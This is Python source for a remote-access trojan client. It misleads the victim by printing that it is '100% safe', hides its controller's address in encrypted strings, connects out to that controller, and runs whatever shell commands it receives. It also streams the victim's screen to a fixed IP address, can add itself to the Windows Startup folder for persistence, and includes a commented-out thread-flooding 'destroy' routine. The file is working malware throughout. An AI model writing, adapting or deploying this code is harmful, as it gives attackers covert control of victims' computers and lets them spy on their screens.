import socket
import sys
import time
import os
import subprocess
import getpass
import cv2
import threading
import numpy as np
from PIL import ImageGrab
from vidstream import StreamingServer

user = getpass.getuser()
import base64
import hashlib
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

time.sleep(0)
HEADERSIZE = 10
print("Hello This is A 100% safe")

__key__ = hashlib.sha256(b'16-character key').digest()


def encrypt(raw):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    raw = base64.b64encode(pad(raw).encode('utf8'))
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key=__key__, mode=AES.MODE_CFB, iv=iv)
    return base64.b64encode(iv + cipher.encrypt(raw))


def decrypt(enc):
    unpad = lambda s: s[:-ord(s[-1:])]

    enc = base64.b64decode(enc)
    iv = enc[:AES.block_size]
    cipher = AES.new(__key__, AES.MODE_CFB, iv)
    return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))


def add_to_startup(file_path=""):
    if user != "alexa" and file_path == '':
        file_path = os.path.abspath(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def connect():
    global s
    global port
    global host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    port = decrypt("+Yy+s+kaxfSsITq9j3TaNHbZtc5Za+EfTAfDs8FL1IUJzSICVkzbgQ==")
    host = decrypt('DGsvot052HH76SVRTIL6NgmLh1ts6x8ZqR6yaIoqDEyn0Fk2coFvKQ==')
    port = int(port)
    while True:
        try:
            s.connect((host, port))
            break
        except ConnectionRefusedError:
            print("Trying again:")


def Command():

    while True:
        com = s.recv(1024)
        s.send("The command was received".encode())
        try:
            if com == "":
                Command()
            if com.decode('utf-8') == "cmd":
                cmd()
            if com.decode('utf-8') == "viewcwd":
                viewcwd()  # dagdfafg
            if com.decode('utf-8') == "SINK IT":
                destroy()
            if com.decode('utf-8') == "SS":
                Screen()
            if com.decode('utf-8') == "quit":
                Command()


                # gafdgadgadgad
            else:
                print("command not recognised")
        except ConnectionResetError:
            connect()


def viewcwd():
    files = os.getcwd()
    files = str(files)
    s.send(files.encode())
    print("command executed")


def cmd():
    odata = (str(os.getcwd()) + '> ')
    s.send(odata.encode('utf-8'))
    while True:
        data = s.recv(1024)
        if str(data.decode('utf-8')) == "quit":
            Command()
        if data[:2] == 'cd':
            os.chdir(data[3:])
            print(1)
        if len(data) > 0:
            print(2)
            cmdd = subprocess.Popen(data.decode('utf-8')[:], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            print(3)
            output_bytes = cmdd.stdout.read() + cmdd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            print(4)
            fdata = (output_str + str(os.getcwd()) + '> ' + ",./")
            s.send(fdata.encode("utf-8"))
            print(5)
            print(output_str)







#def pic():
#    while True:
#        img = cv2.imread('creepy1.jpg', 0)
#        cv2.imshow('creepy', img)
#        cv2.waitKey(0)
#
#
#def destroy():
#    threads = []
#    for _ in range(9999999):
#        t = threading.Thread(target=pic)
#
#        # wooooo
#        t.start()
#        threads.append(t)

def Screen():
    from vidstream import ScreenShareClient
    import threading

    sender = ScreenShareClient('192.168.1.137', 9999)
    t = threading.Thread(target=sender.start_stream)
    t.start()


# add_to_startup(file_path="")
connect()
Command()



